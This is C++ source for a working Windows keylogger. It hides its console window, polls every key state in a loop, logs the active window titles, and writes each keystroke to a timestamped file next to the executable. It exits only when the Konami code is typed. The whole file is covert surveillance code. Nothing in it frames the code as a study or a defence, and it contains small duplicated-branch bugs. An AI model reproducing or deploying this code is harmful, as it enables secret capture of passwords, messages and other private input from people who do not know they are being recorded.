#include "main.h"

using namespace std;

int main(int argc, char *argv[]) {

	ShowWindow(GetConsoleWindow(), 0); // hide this window from the user

	string basepath = dirBasename(getSelfPath());
	
	time_t rawtime;
	struct tm *timeinfo;
	time(&rawtime);
	timeinfo = localtime(&rawtime);
	char filename[MAX_PATH];
	char filepath[MAX_PATH];
	strftime(filename, 100, "%Y-%m-%d_%H-%M-%S", timeinfo);
	sprintf(filepath, "%s\\%s%s", basepath.c_str(), filename, FILEEXT);
	
	string lastTitle = "";
	ofstream klogout(filepath);

	int keys[10] = {};
	
	while(1) {
		Sleep(2); // give other programs time to run
		
		// get the active windowtitle
		char title[1024];
		HWND hwndHandle = GetForegroundWindow();
		GetWindowText(hwndHandle, title, 1023);

		if (lastTitle != title) {
			klogout << endl << endl << "Window: "; // log if the user switched windows
			if (strlen(title) != 0) { // if not an empty window
				klogout << "'" << title << "'";
			}
			klogout << endl;
			lastTitle = title; // save the last window's title
		}
		
		// logging keys, thats the keylogger
		for (unsigned char c = 1; c < 255; c++) {
			SHORT rv = GetAsyncKeyState(c);
			if (rv & 1) { // on press button down
				string out = "";
				if (c == 13)
					out = "[RETURN]";
				else if (c == 16 || c == 17 || c == 18)
					out = "";
				else if (c == 160 || c == 161)
					out = "[SHIFT]";
				else if (c == 162 || c == 163)
					out = "[STRG]";
				else if (c == 164)
					out = "[ALT]";
				else if (c == 165)
					out = "[ALT GR]";
				else if (c == 8)
					out = "[BACKSPACE]";
				else if (c == 9)
					out = "[TAB]";
				else if (c == 27)
					out = "[ESC]";
				else if (c == 33)
					out = "[PAGE UP]";
				else if (c == 34)
					out = "[PAGE DOWN]";
				else if (c == 35)
					out = "[HOME]";
				else if (c == 36)
					out = "[POS1]";
				else if (c == 37)
					out = "[ARROW LEFT]";
				else if (c == 38)
					out = "[ARROW UP]";
				else if (c == 39)
					out = "[ARROW RIGHT]";
				else if (c == 40)
					out = "[ARROW DOWN]";
				else if (c == 45)
					out = "[INS]";
				else if (c == 46)
					out = "[DEL]";
				else if ((c >= 65 && c <= 90)
					|| (c >= 48 && c <= 57)
					|| c == 32)
					out = c;
				
				else if (c == 91 || c == 92)
					out = "[WIN]";
				else if (c >= 96 && c <= 105)
					out = "[NUM " + intToString(c - 96) + "]";
				else if (c == 106)
					out = "[NUM /]";
				else if (c == 107)
					out = "[NUM +]";
				else if (c == 109)
					out = "[NUM -]";
				else if (c == 109)
					out = "[NUM ,]";
				else if (c >= 112 && c <= 123)
					out = "[F" + intToString(c - 111) + "]";
				else if (c == 144)
					out = "[NUM]";
				else if (c == 192)
					out = "[OE]";
				else if (c == 222)
					out = "[AE]";
				else if (c == 186)
					out = "[UE]";
				else if (c == 186)
					out = "+";
				else if (c == 188)
					out = ",";
				else if (c == 189)
					out = "-";
				else if (c == 190)
					out = ".";
				else if (c == 191)
					out = "#";
				else if (c == 226)
					out = "<";
				else
					out = "[KEY \\" + intToString(c) + "]";
				
				// update the array to see the last 10 pressed keys
				for (int i = 0; i < 10; i++) {
					if (i == 9) {
						keys[i] = c;
					} else {
						keys[i] = keys[i + 1];
					}
				}

				cout << out << " (" << (unsigned)c << ")" << endl; // print the pressed key

				klogout << out << ' '; // log the pressed key to file
				klogout.flush();

				// See if the user performed the Konami Code
				if (keys[0] == 38 && // up
					keys[1] == 38 && // up
					keys[2] == 40 && // down
					keys[3] == 40 && // down
					keys[4] == 37 && // left
					keys[5] == 39 && // right
					keys[6] == 37 && // left
					keys[7] == 39 && // right
					keys[8] == 66 && // B
					keys[9] == 65) { // A

					ShowWindow(GetConsoleWindow(), 1);
					cout << "Konami Code Performed. Exiting..." << endl;
					Sleep(1000);
					klogout.close(); // close the file stream
					return 0;
				}
			}
		}
		
	}
	
	klogout.close();
	
	return 0;
}
